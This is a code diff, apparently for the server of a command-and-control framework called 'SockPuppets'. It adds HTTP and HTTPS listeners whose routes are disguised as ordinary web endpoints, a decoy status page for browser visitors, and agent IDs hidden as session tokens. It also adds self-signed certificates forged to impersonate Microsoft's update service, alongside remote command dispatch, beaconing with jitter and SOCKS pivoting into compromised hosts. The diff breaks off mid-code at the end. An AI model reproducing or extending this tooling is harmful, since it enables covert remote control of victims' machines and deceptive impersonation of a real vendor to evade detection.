@@ -2,6 +2,7 @@
 """
 SockPuppets Server
 Handles agent connections, command dispatch, and session management
+Supports WebSocket, HTTP, and HTTPS transports
 """
 
 import asyncio
@@ -12,13 +13,18 @@ import base64
 import socket
 import struct
 import zlib
+import ssl
+import os
 from pathlib import Path
 from datetime import datetime
-from typing import Dict, Set
+from typing import Dict, Set, Optional
 import logging
-import ssl
-from http.server import HTTPServer, BaseHTTPRequestHandler
 import threading
+
+try:
+    from aiohttp import web
+except ImportError:
+    web = None
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
@@ -29,10 +35,11 @@ logging.getLogger('websockets').setLevel(logging.WARNING)
 
 class Agent:
     """Represents a connected agent"""
-    def __init__(self, websocket, agent_id: str, metadata: dict):
-        self.websocket = websocket
+    def __init__(self, agent_id: str, metadata: dict, transport_type: str = 'websocket'):
         self.agent_id = agent_id
         self.metadata = metadata
+        self.transport_type = transport_type  # 'websocket', 'http', 'https'
+        self.websocket = None  # WebSocket connection (if WS transport)
         self.connected_at = datetime.now()
         self.last_seen = datetime.now()
         self.command_queue = asyncio.Queue()
@@ -45,6 +52,7 @@ class Agent:
         self.pending_results = []  # Store results from beacon checkins
         self.command_history = []  # Track commands sent
         self.command_sender_task = None  # Track send_commands task
+        self.http_pending_commands = []  # Commands waiting for HTTP poll pickup
 
     def get_info(self) -> dict:
         info = {
@@ -56,68 +64,26 @@ class Agent:
             'connected_at': self.connected_at.strftime('%Y-%m-%d %H:%M:%S'),
             'last_seen': self.last_seen.strftime('%Y-%m-%d %H:%M:%S'),
             'mode': self.mode,
+            'transport': self.transport_type,
             'beacon_interval': self.beacon_interval if self.mode == 'beacon' else 'N/A'
         }
         if self.mode == 'beacon' and self.beacon_jitter > 0:
             info['beacon_jitter'] = f"{self.beacon_jitter}%"
         return info
 
+    def is_http(self) -> bool:
+        return self.transport_type in ('http', 'https')
+
 
 class SockPuppetsServer:
     """Main server class"""
-    def __init__(self, host: str = '0.0.0.0', port: int = 8443, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
-                 use_ssl: bool = False, cert_file: str = None, key_file: str = None):
-        self.host = host
-        self.port = port
+    def __init__(self, encryption_key: str = 'SOCKPUPPETS_KEY_2026'):
         self.encryption_key = encryption_key.encode() if isinstance(encryption_key, str) else encryption_key
         self.agents: Dict[str, Agent] = {}
         self.active_connections: Set[websockets.WebSocketServerProtocol] = set()
+        self.listeners: Dict[str, dict] = {}  # Track active listeners {name: {type, host, port, task, ...}}
         self.streaming_module = self._load_streaming_module()
         self.ws_server = None
-        self.use_ssl = use_ssl
-        self.ssl_context = None
-        if use_ssl:
-            self.ssl_context = self._setup_ssl(cert_file, key_file)
-
-    def _setup_ssl(self, cert_file: str = None, key_file: str = None):
-        """Setup SSL context for WSS connections"""
-        ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-        if cert_file and key_file:
-            ssl_ctx.load_cert_chain(cert_file, key_file)
-            logger.info(f"Loaded SSL certificate: {cert_file}")
-        else:
-            # Generate self-signed cert
-            cert_path, key_path = self._generate_self_signed_cert()
-            ssl_ctx.load_cert_chain(cert_path, key_path)
-            logger.info(f"Generated self-signed certificate")
-        return ssl_ctx
-
-    @staticmethod
-    def _generate_self_signed_cert():
-        """Generate a self-signed certificate for WSS"""
-        try:
-            from pathlib import Path
-            cert_dir = Path(__file__).parent / 'certs'
-            cert_dir.mkdir(exist_ok=True)
-            cert_path = cert_dir / 'server.pem'
-            key_path = cert_dir / 'server.key'
-
-            if cert_path.exists() and key_path.exists():
-                return str(cert_path), str(key_path)
-
-            # Use openssl to generate self-signed cert
-            import subprocess
-            subprocess.run([
-                'openssl', 'req', '-x509', '-newkey', 'rsa:2048',
-                '-keyout', str(key_path), '-out', str(cert_path),
-                '-days', '365', '-nodes',
-                '-subj', '/CN=localhost'
-            ], check=True, capture_output=True)
-            logger.info(f"Generated self-signed cert at {cert_path}")
-            return str(cert_path), str(key_path)
-        except Exception as e:
-            logger.error(f"Failed to generate self-signed cert: {e}")
-            raise
 
     def _load_streaming_module(self) -> str:
         """Load and compress streaming module"""
@@ -150,21 +116,120 @@ class SockPuppetsServer:
         decrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(decoded))
         return decrypted.decode('latin-1')
 
+    # ──────────────────────────────────────────────
+    # TLS Certificate Management
+    # ──────────────────────────────────────────────
+
+    def _generate_self_signed_cert(self, cert_path: str, key_path: str):
+        """Generate a self-signed TLS certificate"""
+        try:
+            from cryptography import x509
+            from cryptography.x509.oid import NameOID
+            from cryptography.hazmat.primitives import hashes, serialization
+            from cryptography.hazmat.primitives.asymmetric import rsa
+            import datetime as dt
+
+            key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+
+            subject = issuer = x509.Name([
+                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
+                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Microsoft Corporation"),
+                x509.NameAttribute(NameOID.COMMON_NAME, "update.microsoft.com"),
+            ])
+
+            cert = (
+                x509.CertificateBuilder()
+                .subject_name(subject)
+                .issuer_name(issuer)
+                .public_key(key.public_key())
+                .serial_number(x509.random_serial_number())
+                .not_valid_before(dt.datetime.now(dt.timezone.utc))
+                .not_valid_after(dt.datetime.now(dt.timezone.utc) + dt.timedelta(days=365))
+                .sign(key, hashes.SHA256())
+            )
+
+            with open(cert_path, "wb") as f:
+                f.write(cert.public_bytes(serialization.Encoding.PEM))
+
+            with open(key_path, "wb") as f:
+                f.write(key.private_bytes(
+                    serialization.Encoding.PEM,
+                    serialization.PrivateFormat.TraditionalOpenSSL,
+                    serialization.NoEncryption()
+                ))
+
+            logger.info(f"Generated self-signed certificate: {cert_path}")
+            return True
+
+        except ImportError:
+            # Fallback: use openssl command
+            try:
+                import subprocess
+                subprocess.run([
+                    'openssl', 'req', '-x509', '-newkey', 'rsa:2048',
+                    '-keyout', key_path, '-out', cert_path,
+                    '-days', '365', '-nodes',
+                    '-subj', '/CN=update.microsoft.com/O=Microsoft Corporation/C=US'
+                ], capture_output=True, check=True)
+                logger.info(f"Generated self-signed certificate via openssl: {cert_path}")
+                return True
+            except (subprocess.CalledProcessError, FileNotFoundError):
+                logger.error("Cannot generate TLS cert: install 'cryptography' package or ensure 'openssl' is in PATH")
+                return False
+
+    def _get_ssl_context(self, cert_path: Optional[str] = None, key_path: Optional[str] = None) -> Optional[ssl.SSLContext]:
+        """Get or create SSL context for HTTPS listener"""
+        certs_dir = Path(__file__).parent / 'certs'
+        certs_dir.mkdir(exist_ok=True)
+
+        if cert_path and key_path:
+            # User-provided certs
+            if not Path(cert_path).exists() or not Path(key_path).exists():
+                logger.error(f"Certificate files not found: {cert_path}, {key_path}")
+                return None
+        else:
+            # Auto-generate self-signed
+            cert_path = str(certs_dir / 'server.pem')
+            key_path = str(certs_dir / 'server.key')
+
+            if not Path(cert_path).exists() or not Path(key_path).exists():
+                logger.info("Generating self-signed TLS certificate...")
+                if not self._generate_self_signed_cert(cert_path, key_path):
+                    return None
+
+        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        ctx.load_cert_chain(cert_path, key_path)
+        return ctx
+
+    # ──────────────────────────────────────────────
+    # Agent Registration (transport-agnostic)
+    # ──────────────────────────────────────────────
+
+    def register_agent_common(self, agent_id: str, metadata: dict, transport_type: str) -> Agent:
+        """Register a new agent (shared by WS and HTTP handlers)"""
+        agent = Agent(agent_id, metadata, transport_type)
+        self.agents[agent_id] = agent
+        logger.info(f"New agent registered: {agent_id} ({metadata.get('hostname', 'Unknown')}) via {transport_type.upper()}")
+        return agent
+
     async def register_agent(self, websocket, message: dict) -> str:
-        """Register a new agent connection"""
+        """Register a new agent connection (WebSocket)"""
         agent_id = str(uuid.uuid4())[:8]
         metadata = message.get('metadata', {})
         metadata['ip'] = websocket.remote_address[0]
 
-        agent = Agent(websocket, agent_id, metadata)
-        self.agents[agent_id] = agent
+        agent = self.register_agent_common(agent_id, metadata, 'websocket')
+        agent.websocket = websocket
         self.active_connections.add(websocket)
 
-        logger.info(f"New agent registered: {agent_id} ({metadata.get('hostname', 'Unknown')})")
         return agent_id
 
+    # ──────────────────────────────────────────────
+    # WebSocket Handler (existing, unchanged logic)
+    # ──────────────────────────────────────────────
+
     async def handle_agent(self, websocket, path=None):
-        """Handle individual agent connection"""
+        """Handle individual agent connection (WebSocket)"""
         agent_id = None
         try:
             async for message in websocket:
@@ -196,6 +261,7 @@ class SockPuppetsServer:
                             # Update existing agent's connection
                             agent = self.agents[agent_id]
                             agent.websocket = websocket
+                            agent.transport_type = 'websocket'
                             agent.last_seen = datetime.now()
                             self.active_connections.add(websocket)
 
@@ -205,9 +271,6 @@ class SockPuppetsServer:
                                 agent.mode = metadata.get('mode', agent.mode)
                                 agent.beacon_interval = metadata.get('beacon_interval', agent.beacon_interval)
                                 agent.beacon_jitter = metadata.get('beacon_jitter', agent.beacon_jitter)
-
-                            # Silent checkin - don't spam logs
-                            # logger.info(f"Agent {agent_id} checked in ({agent.metadata.get('hostname', 'Unknown')})")
 
                             # Restart command sender task if it died
                             if agent.command_sender_task is None or agent.command_sender_task.done():
@@ -278,6 +341,10 @@ class SockPuppetsServer:
                             self.agents[agent_id].last_seen = datetime.now()
                             logger.info(f"Agent {agent_id} switched to {new_mode} mode")
 
+                    elif msg_type == 'upgrade_failed':
+                        if agent_id and agent_id in self.agents:
+                            logger.warning(f"Agent {agent_id} failed to upgrade to WebSocket, continuing HTTP")
+
                 except json.JSONDecodeError:
                     logger.error("Failed to decode message")
                 except Exception as e:
@@ -291,11 +358,15 @@ class SockPuppetsServer:
                 # Don't remove agent immediately to preserve session info
 
     async def send_commands(self, agent_id: str):
-        """Send queued commands to agent"""
+        """Send queued commands to agent (WebSocket transport)"""
         if agent_id not in self.agents:
             return
 
         agent = self.agents[agent_id]
+
+        # HTTP agents don't use this task — commands are delivered via poll response
+        if agent.is_http():
+            return
 
         try:
             while True:
@@ -334,6 +405,235 @@ class SockPuppetsServer:
         except Exception as e:
             logger.error(f"Error in send_commands for {agent_id}: {e}")
 
+    # ──────────────────────────────────────────────
+    # HTTP/HTTPS Handler (aiohttp)
+    # ──────────────────────────────────────────────
+
+    def _create_http_app(self) -> 'web.Application':
+        """Create aiohttp application with disguised routes"""
+        if web is None:
+            raise ImportError("aiohttp is required for HTTP/HTTPS listeners. Install with: pip install aiohttp")
+
+        app = web.Application()
+        app.router.add_post('/submit-form', self._http_handle_register)
+        app.router.add_post('/api/v1/update', self._http_handle_checkin)
+        app.router.add_post('/upload', self._http_handle_results)
+        app.router.add_get('/health', self._http_handle_heartbeat)
+        # Serve a fake index page for browser visits
+        app.router.add_get('/', self._http_handle_index)
+        return app
+
+    async def _http_handle_index(self, request: 'web.Request') -> 'web.Response':
+        """Serve a fake page for browser visitors"""
+        html = """<!DOCTYPE html>
+<html><head><title>Service Status</title></head>
+<body><h1>Service is running</h1><p>All systems operational.</p></body></html>"""
+        return web.Response(text=html, content_type='text/html')
+
+    async def _http_handle_register(self, request: 'web.Request') -> 'web.Response':
+        """Handle agent registration via HTTP POST"""
+        try:
+            body = await request.text()
+            decrypted = self.simple_decrypt(body)
+            data = json.loads(decrypted)
+
+            msg_type = data.get('type')
+            if msg_type != 'register':
+                return web.Response(status=400)
+
+            agent_id = str(uuid.uuid4())[:8]
+            metadata = data.get('metadata', {})
+
+            # Get client IP
+            peername = request.remote
+            metadata['ip'] = peername or 'Unknown'
+
+            # Determine transport type from request scheme
+            transport_type = 'https' if request.secure else 'http'
+
+            agent = self.register_agent_common(agent_id, metadata, transport_type)
+
+            response = {
+                'type': 'registered',
+                'agent_id': agent_id,
+                'status': 'success'
+            }
+            encrypted_response = self.simple_encrypt(json.dumps(response))
+            return web.Response(text=encrypted_response, content_type='text/html')
+
+        except Exception as e:
+            logger.error(f"HTTP register error: {e}")
+            return web.Response(status=500)
+
+    async def _http_handle_checkin(self, request: 'web.Request') -> 'web.Response':
+        """Handle agent checkin/poll via HTTP POST (beacon or long-poll)"""
+        try:
+            body = await request.text()
+            decrypted = self.simple_decrypt(body)
+            data = json.loads(decrypted)
+
+            msg_type = data.get('type')
+            agent_id = data.get('agent_id')
+
+            if msg_type == 'checkin' and agent_id:
+                if agent_id in self.agents:
+                    agent = self.agents[agent_id]
+                    agent.last_seen = datetime.now()
+
+                    # Update transport type if changed
+                    transport_type = 'https' if request.secure else 'http'
+                    agent.transport_type = transport_type
+
+                    # Update metadata if provided
+                    metadata = data.get('metadata', {})
+                    if metadata:
+                        agent.mode = metadata.get('mode', agent.mode)
+                        agent.beacon_interval = metadata.get('beacon_interval', agent.beacon_interval)
+                        agent.beacon_jitter = metadata.get('beacon_jitter', agent.beacon_jitter)
+
+                    # Process any results sent with the checkin
+                    results = data.get('results', [])
+                    for result in results:
+                        output = result.get('output', '')
+                        command = result.get('command', '')
+                        timestamp = result.get('timestamp', '')
+
+                        if agent.mode == 'beacon':
+                            agent.pending_results.append({
+                                'command': command,
+                                'output': output,
+                                'timestamp': timestamp,
+                                'received_at': datetime.now().isoformat()
+                            })
+                        else:
+                            try:
+                                agent.response_queue.put_nowait(output)
+                            except asyncio.QueueFull:
+                                pass
+
+                    # Collect commands to send back
+                    commands = []
+
+                    if agent.mode == 'beacon':
+                        # Beacon mode: drain all queued commands immediately
+                        while not agent.command_queue.empty():
+                            try:
+                                cmd = agent.command_queue.get_nowait()
+                                commands.append({
+                                    'type': 'command',
+                                    'command': cmd,
+                                    'timestamp': datetime.now().isoformat()
+                                })
+                                logger.info(f"HTTP command sent to {agent_id}: {cmd}")
+                            except asyncio.QueueEmpty:
+                                break
+                    else:
+                        # Long-poll mode: wait up to 30s for a command
+                        try:
+                            cmd = await asyncio.wait_for(agent.command_queue.get(), timeout=30.0)
+                            commands.append({
+                                'type': 'command',
+                                'command': cmd,
+                                'timestamp': datetime.now().isoformat()
+                            })
+                            logger.info(f"HTTP long-poll command sent to {agent_id}: {cmd}")
+                        except asyncio.TimeoutError:
+                            pass  # No commands, return empty
+
+                    if commands:
+                        response = {
+                            'type': 'commands',
+                            'commands': commands
+                        }
+                    else:
+                        response = {
+                            'type': 'no_commands'
+                        }
+
+                    encrypted_response = self.simple_encrypt(json.dumps(response))
+                    return web.Response(text=encrypted_response, content_type='text/html')
+
+                else:
+                    # Unknown agent_id — re-register
+                    new_id = str(uuid.uuid4())[:8]
+                    metadata = data.get('metadata', {})
+                    peername = request.remote
+                    metadata['ip'] = peername or 'Unknown'
+                    transport_type = 'https' if request.secure else 'http'
+                    self.register_agent_common(new_id, metadata, transport_type)
+
+                    response = {
+                        'type': 'registered',
+                        'agent_id': new_id,
+                        'status': 'success'
+                    }
+                    encrypted_response = self.simple_encrypt(json.dumps(response))
+                    return web.Response(text=encrypted_response, content_type='text/html')
+
+            return web.Response(status=400)
+
+        except Exception as e:
+            logger.error(f"HTTP checkin error: {e}")
+            return web.Response(status=500)
+
+    async def _http_handle_results(self, request: 'web.Request') -> 'web.Response':
+        """Handle command results via HTTP POST"""
+        try:
+            body = await request.text()
+            decrypted = self.simple_decrypt(body)
+            data = json.loads(decrypted)
+
+            agent_id = data.get('agent_id')
+            if not agent_id or agent_id not in self.agents:
+                return web.Response(status=404)
+
+            agent = self.agents[agent_id]
+            agent.last_seen = datetime.now()
+
+            output = data.get('output', '')
+            command = data.get('command', '')
+            timestamp = data.get('timestamp', '')
+
+            if agent.mode == 'beacon':
+                agent.pending_results.append({
+                    'command': command,
+                    'output': output,
+                    'timestamp': timestamp,
+                    'received_at': datetime.now().isoformat()
+                })
+            else:
+                try:
+                    agent.response_queue.put_nowait(output)
+                except asyncio.QueueFull:
+                    pass
+
+            logger.debug(f"HTTP result received from {agent_id}: {command[:50]}...")
+
+            response = {'type': 'result_ack', 'status': 'success'}
+            encrypted_response = self.simple_encrypt(json.dumps(response))
+            return web.Response(text=encrypted_response, content_type='text/html')
+
+        except Exception as e:
+            logger.error(f"HTTP results error: {e}")
+            return web.Response(status=500)
+
+    async def _http_handle_heartbeat(self, request: 'web.Request') -> 'web.Response':
+        """Handle heartbeat via HTTP GET"""
+        # Check for agent_id in query params (disguised as session token)
+        agent_id = request.query.get('sid', '')
+
+        if agent_id and agent_id in self.agents:
+            self.agents[agent_id].last_seen = datetime.now()
+
+        # Always return a normal-looking health response
+        response = {'type': 'heartbeat_ack', 'status': 'alive'}
+        encrypted_response = self.simple_encrypt(json.dumps(response))
+        return web.Response(text=encrypted_response, content_type='text/html')
+
+    # ──────────────────────────────────────────────
+    # Command dispatch (transport-agnostic)
+    # ──────────────────────────────────────────────
+
     async def send_command_to_agent(self, agent_id: str, command: str) -> str:
         """Queue command for agent and wait for response"""
         if agent_id not in self.agents:
@@ -352,9 +652,18 @@ class SockPuppetsServer:
 
         # For beacon mode, return immediately
         if agent.mode == 'beacon':
-            return f"[*] Command queued for beacon (will execute on next checkin in ~{agent.beacon_interval}s)"
+            transport_note = f" via {agent.transport_type.upper()}" if agent.is_http() else ""
+            return f"[*] Command queued for beacon{transport_note} (will execute on next checkin in ~{agent.beacon_interval}s)"
 
-        # For streaming mode, wait for response
+        # For HTTP streaming (long-poll), command will be picked up on next poll
+        if agent.is_http():
+            try:
+                response = await asyncio.wait_for(agent.response_queue.get(), timeout=60.0)
+                return response
+            except asyncio.TimeoutError:
+                return "Command timeout - no response from agent (HTTP long-poll)"
+
+        # For WebSocket streaming mode, wait for response
         if agent.websocket not in self.active_connections:
             return "Agent is not connected"
 
@@ -372,8 +681,18 @@ class SockPuppetsServer:
         """Get list of active agents"""
         active = []
         for agent in self.agents.values():
-            if agent.websocket in self.active_connections:
-                active.append(agent.get_info())
+            if agent.is_http():
+                # HTTP agent is active if seen recently
+                if agent.mode == 'beacon':
+                    max_interval = agent.beacon_interval * 2 + 60
+                else:
+                    max_interval = 90  # Long-poll timeout + buffer
+                time_since = (datetime.now() - agent.last_seen).total_seconds()
+                if time_since < max_interval:
+                    active.append(agent.get_info())
+            else:
+                if agent.websocket in self.active_connections:
+                    active.append(agent.get_info())
         return active
 
     def get_agent_results(self, agent_id: str, clear: bool = False) -> list:
@@ -390,9 +709,7 @@ class SockPuppetsServer:
         return results
 
     def check_agent_health(self, agent_id: str) -> str:
-        """Check if beacon agent might be dead
-        Returns warning message if agent is potentially dead, empty string otherwise
-        """
+        """Check if beacon agent might be dead"""
         if agent_id not in self.agents:
             return ""
 
@@ -414,7 +731,6 @@ class SockPuppetsServer:
         time_since_last_seen = (datetime.now() - agent.last_seen).total_seconds()
 
         if time_since_last_seen > max_expected_interval:
-            minutes_overdue = int((time_since_last_seen - max_expected_interval) / 60)
             return f"Agent {agent_id} may be dead (last seen {int(time_since_last_seen/60)} minutes ago, expected checkin every {beacon_interval}s)"
 
         return ""
@@ -426,6 +742,11 @@ class SockPuppetsServer:
 
         agent = self.agents[agent_id]
         agent.beacon_interval = interval
+
+        if agent.is_http():
+            # For HTTP agents, queue a set_interval command for next poll
+            await agent.command_queue.put(f"__set_interval:{interval}")
+            return f"Beacon interval command queued (will apply on next checkin)"
 
         message = {
             'type': 'set_interval',
@@ -442,7 +763,6 @@ class SockPuppetsServer:
                     logger.info(f"Set beacon interval for {agent_id} to {interval}s")
                     return f"Beacon interval set to {interval} seconds"
                 else:
-                    # Beacon is disconnected, wait for it to check in
                     if attempt < max_retries - 1:
                         await asyncio.sleep(1)
                     else:
@@ -456,7 +776,7 @@ class SockPuppetsServer:
         return "Failed to set beacon interval"
 
     async def upgrade_to_streaming(self, agent_id: str) -> str:
-        """Upgrade agent from beacon to streaming mode (staged loading)"""
+        """Upgrade agent from beacon to streaming mode"""
         if agent_id not in self.agents:
             return "Agent not found"
 
@@ -465,10 +785,16 @@ class SockPuppetsServer:
         if agent.mode == 'streaming':
             return "Agent is already in streaming mode"
 
+        if agent.is_http():
+            # For HTTP agents, upgrade means switching to long-poll mode
+            agent.mode = 'streaming'
+            logger.info(f"Agent {agent_id} upgraded to streaming/long-poll mode via {agent.transport_type.upper()}")
+            return f"Agent upgraded to streaming mode (HTTP long-poll)"
+
         if not self.streaming_module:
             return "Error: Streaming module not available"
 
-        # Send upgrade command with streaming module
+        # WebSocket: send upgrade command with streaming module
         message = {
             'type': 'upgrade_mode',
             'mode': 'streaming',
@@ -476,7 +802,6 @@ class SockPuppetsServer:
         }
         encrypted = self.simple_encrypt(json.dumps(message))
 
-        # For beacon mode, wait for agent to check in
         max_retries = 60 if agent.mode == 'beacon' else 1
         for attempt in range(max_retries):
             try:
@@ -486,7 +811,6 @@ class SockPuppetsServer:
                     logger.info(f"Agent {agent_id} upgraded to streaming mode (staged module: {len(self.streaming_module)} bytes)")
                     return f"Agent upgraded to streaming mode (loaded {len(self.streaming_module)} byte module)"
                 else:
-                    # Beacon is disconnected, wait for it to check in
                     if attempt < max_retries - 1:
                         await asyncio.sleep(1)
                     else:
@@ -499,6 +823,36 @@ class SockPuppetsServer:
 
         return "Upgrade failed"
 
+    async def upgrade_to_websocket(self, agent_id: str, ws_host: str = None, ws_port: int = None) -> str:
+        """Upgrade HTTP agent to WebSocket transport"""
+        if agent_id not in self.agents:
+            return "Agent not found"
+
+        agent = self.agents[agent_id]
+
+        if not agent.is_http():
+            return "Agent is already using WebSocket transport"
+
+        # Find the WebSocket listener to get its host/port
+        if ws_host is None or ws_port is None:
+            for name, info in self.listeners.items():
+                if info['type'] == 'websocket':
+                    ws_host = info['host']
+                    ws_port = info['port']
+                    break
+
+        if ws_host is None or ws_port is None:
+            return "No WebSocket listener running. Start one first with 'start [host] [port]'"
+
+        # Queue upgrade command for the HTTP agent
+        upgrade_cmd = json.dumps({
+            'type': 'upgrade_websocket',
+            'ws_host': ws_host,
+            'ws_port': ws_port
+        })
+        await agent.command_queue.put(f"__upgrade_ws:{upgrade_cmd}")
+        return f"WebSocket upgrade command queued (agent will connect to ws://{ws_host}:{ws_port})"
+
     async def downgrade_to_beacon(self, agent_id: str, interval: int = 60) -> str:
         """Downgrade agent from streaming to beacon mode"""
         if agent_id not in self.agents:
@@ -508,6 +862,13 @@ class SockPuppetsServer:
 
         if agent.mode == 'beacon':
             return "Agent is already in beacon mode"
+
+        if agent.is_http():
+            # For HTTP agents, just switch mode
+            agent.mode = 'beacon'
+            agent.beacon_interval = interval
+            logger.info(f"Agent {agent_id} downgraded to beacon mode ({interval}s) via {agent.transport_type.upper()}")
+            return f"Agent downgraded to beacon mode ({interval}s interval)"
 
         if agent.websocket not in self.active_connections:
             return "Agent not connected (cannot downgrade)"
@@ -535,13 +896,19 @@ class SockPuppetsServer:
 
         agent = self.agents[agent_id]
 
+        if agent.is_http():
+            # Queue kill command for next HTTP poll
+            await agent.command_queue.put("__kill")
+            # Remove agent from tracking
+            del self.agents[agent_id]
+            return f"Agent {agent_id} kill command queued (will terminate on next checkin)"
+
         message = {
             'type': 'kill',
             'command': 'terminate'
         }
         encrypted = self.simple_encrypt(json.dumps(message))
 
-        # For beacon mode, wait for agent to check in
         max_retries = 60 if agent.mode == 'beacon' else 1
         for attempt in range(max_retries):
             try:
@@ -549,18 +916,15 @@ class SockPuppetsServer:
                     await agent.websocket.send(encrypted)
                     logger.info(f"Kill command sent to {agent_id}")
 
-                    # Remove agent from tracking
                     if agent.websocket in self.active_connections:
                         self.active_connections.discard(agent.websocket)
                     del self.agents[agent_id]
 
                     return f"Agent {agent_id} killed successfully"
                 else:
-                    # Beacon is disconnected, wait for it to check in
                     if attempt < max_retries - 1:
                         await asyncio.sleep(1)
                     else:
-                        # Remove agent anyway after timeout
                         if agent_id in self.agents:
                             del self.agents[agent_id]
                         return f"Kill timeout - agent didn't check in (removed from tracking)"
@@ -568,7 +932,6 @@ class SockPuppetsServer:
                 if attempt < max_retries - 1:
                     await asyncio.sleep(1)
                 else:
-                    # Remove agent anyway
                     if agent_id in self.agents:
                         del self.agents[agent_id]
                     return f"Agent connection closed (removed from tracking)"
@@ -581,6 +944,10 @@ class SockPuppetsServer:
             return "Agent not found"
 
         agent = self.agents[agent_id]
+
+        if agent.is_http():
+            return "SOCKS proxy is not supported over HTTP transport (requires WebSocket)"
+
         if agent.websocket not in self.active_connections:
             return "Agent not connected"
 
@@ -588,11 +955,9 @@ class SockPuppetsServer:
             return f"SOCKS proxy already running on port {agent.socks_proxy}"
 
         try:
-            # Start SOCKS server
             agent.socks_proxy = local_port
             asyncio.create_task(self._run_socks_server(agent_id, local_port))
 
-            # Send command to agent to prepare for SOCKS
             message = {
                 'type': 'socks_init',
                 'port': local_port
@@ -666,7 +1031,6 @@ class SockPuppetsServer:
                 await writer.wait_closed()
                 return
 
-            # Send connection request to agent
             conn_msg = {
                 'type': 'socks_connect',
                 'host': addr,
@@ -675,11 +1039,9 @@ class SockPuppetsServer:
             encrypted = self.simple_encrypt(json.dumps(conn_msg))
             await agent.websocket.send(encrypted)
 
-            # Send success response
             writer.write(b'\x05\x00\x00\x01' + b'\x00' * 6)
             await writer.drain()
 
-            # Relay data
             await asyncio.gather(
                 self._relay_socks_to_agent(agent, reader),
                 self._relay_agent_to_socks(agent, writer)
@@ -720,120 +1082,122 @@ class SockPuppetsServer:
         except Exception as e:
             logger.error(f"Relay to SOCKS error: {e}")
 
-    def _make_hta_handler(self):
-        """Create HTTP request handler class for HTA polling agents"""
-        server_ref = self
+    # ──────────────────────────────────────────────
+    # Listener Management
+    # ──────────────────────────────────────────────
 
-        class HTAHandler(BaseHTTPRequestHandler):
-            def log_message(self, format, *args):
-                pass  # Suppress default HTTP logging
+    async def start_ws_listener(self, host: str = '0.0.0.0', port: int = 8443):
+        """Start WebSocket listener"""
+        listener_name = f"ws_{port}"
+        if listener_name in self.listeners:
+            logger.warning(f"WebSocket listener already running on port {port}")
+            return
 
-            def do_POST(self):
-                if self.path != '/hta':
-                    self.send_error(404)
-                    return
+        logger.info(f"Starting WebSocket listener on {host}:{port}")
+        server = await websockets.serve(self.handle_agent, host, port, max_size=10485760)
 
-                content_length = int(self.headers.get('Content-Length', 0))
-                body = self.rfile.read(content_length).decode('utf-8', errors='replace')
+        self.listeners[listener_name] = {
+            'type': 'websocket',
+            'host': host,
+            'port': port,
+            'server': server,
+            'started_at': datetime.now().isoformat()
+        }
+        logger.info(f"WebSocket listener started on {host}:{port}")
 
+    async def start_http_listener(self, host: str = '0.0.0.0', port: int = 8080):
+        """Start HTTP listener"""
+        if web is None:
+            raise ImportError("aiohttp is required for HTTP listeners. Install with: pip install aiohttp")
+
+        listener_name = f"http_{port}"
+        if listener_name in self.listeners:
+            logger.warning(f"HTTP listener already running on port {port}")
+            return
+
+        app = self._create_http_app()
+        runner = web.AppRunner(app)
+        await runner.setup()
+        site = web.TCPSite(runner, host, port)
+        await site.start()
+
+        self.listeners[listener_name] = {
+            'type': 'http',
+            'host': host,
+            'port': port,
+            'runner': runner,
+            'site': site,
+            'started_at': datetime.now().isoformat()
+        }
+        logger.info(f"HTTP listener started on {host}:{port}")
+
+    async def start_https_listener(self, host: str = '0.0.0.0', port: int = 443,
+                                    cert_path: Optional[str] = None, key_path: Optional[str] = None):
+        """Start HTTPS listener"""
+        if web is None:
+            raise ImportError("aiohttp is required for HTTPS listeners. Install with: pip install aiohttp")
+
+        listener_name = f"https_{port}"
+        if listener_name in self.listeners:
+            logger.warning(f"HTTPS listener already running on port {port}")
+            return
+
+        ssl_ctx = self._get_ssl_context(cert_path, key_path)
+        if ssl_ctx is None:
+            raise RuntimeError("Failed to create SSL context")
+
+        app = self._create_http_app()
+        runner = web.AppRunner(app)
+        await runner.setup()
+        site = web.TCPSite(runner, host, port, ssl_context=ssl_ctx)
+        await site.start()
+
+        self.listeners[listener_name] = {
+            'type': 'https',
+            'host': host,
+            'port': port,
+            'runner': runner,
+            'site': site,
+            'ssl_context': ssl_ctx,
+            'started_at': datetime.now().isoformat()
+        }
+        logger.info(f"HTTPS listener started on {host}:{port}")
+
+    async def stop_listener(self, listener_type: Optional[str] = None):
+        """Stop listener(s). If type is None, stop all."""
+        to_remove = []
+        for name, info in self.listeners.items():
+            if listener_type is None or info['type'] == listener_type:
                 try:
-                    decrypted = server_ref.simple_decrypt(body)
-                    data = json.loads(decrypted)
-                    msg_type = data.get('type')
-
-                    if msg_type == 'register':
-                        agent_id = str(uuid.uuid4())[:8]
-                        metadata = data.get('metadata', {})
-                        metadata['ip'] = self.client_address[0]
-                        # Create agent without websocket (HTTP-based)
-                        agent = Agent(None, agent_id, metadata)
-                        agent.mode = 'http_poll'
-                        server_ref.agents[agent_id] = agent
-                        logger.info(f"HTA agent registered: {agent_id} ({metadata.get('hostname', 'Unknown')})")
-
-                        response = {'type': 'registered', 'agent_id': agent_id, 'status': 'success'}
-                        encrypted = server_ref.simple_encrypt(json.dumps(response))
-                        self.send_response(200)
-                        self.send_header('Content-Type', 'text/plain')
-                        self.end_headers()
-                        self.wfile.write(encrypted.encode())
-
-                    elif msg_type == 'checkin':
-                        agent_id = data.get('agent_id', '')
-                        if agent_id in server_ref.agents:
-                            agent = server_ref.agents[agent_id]
-                            agent.last_seen = datetime.now()
-
-                            # Check if there are pending commands (thread-safe, no event loop needed)
-                            if not agent.command_queue.empty():
-                                try:
-                                    command = agent.command_queue.get_nowait()
-                                    response = {'type': 'command', 'command': command, 'timestamp': datetime.now().isoformat()}
-                                except Exception:
-                                    response = {'type': 'checkin_ack', 'agent_id': agent_id, 'status': 'success'}
-                            else:
-                                response = {'type': 'checkin_ack', 'agent_id': agent_id, 'status': 'success'}
-                        else:
-                            response = {'type': 'error', 'message': 'Unknown agent'}
-
-                        encrypted = server_ref.simple_encrypt(json.dumps(response))
-                        self.send_response(200)
-                        self.send_header('Content-Type', 'text/plain')
-                        self.end_headers()
